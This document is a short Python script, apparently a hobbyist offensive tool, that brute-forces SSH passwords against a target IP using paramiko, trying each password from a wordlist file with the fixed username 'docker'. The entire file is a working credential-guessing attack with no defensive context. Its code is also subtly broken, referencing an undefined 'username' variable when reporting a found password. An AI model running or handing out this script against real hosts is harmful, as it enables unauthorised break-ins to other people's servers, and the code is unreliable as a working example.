import paramiko
import os,sys,time,optparse

def brute_ssh():
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	#checking the path
	if os.path.exists(file_path) == False:
		print("\n[-] Error: File not found")
		sys.exit(2)
	else:
		file = open(file_path)
	for line in file.readlines():
		splitted = line.split()
		password = splitted[0]
		print(splitted)
		response = 0
		try:
			ssh.connect(target_ip, port=22, username="docker", password=password)
		except paramiko.AuthenticationException:
			response=1
			time.sleep(10)
		if response == 0:
			print("\n[+] Gotcha!!! Username: " + username + " Password: " + password)
	ssh.close()
	file.close()

parser = optparse.OptionParser()

parser.add_option("-t","--target",dest="target_ip", help="set target's IP")
parser.add_option("-f","--file", dest="file_path", help="set a file as input")

(options,arguments) = parser.parse_args()
target_ip = options.target_ip
file_path = options.file_path
brute_ssh()
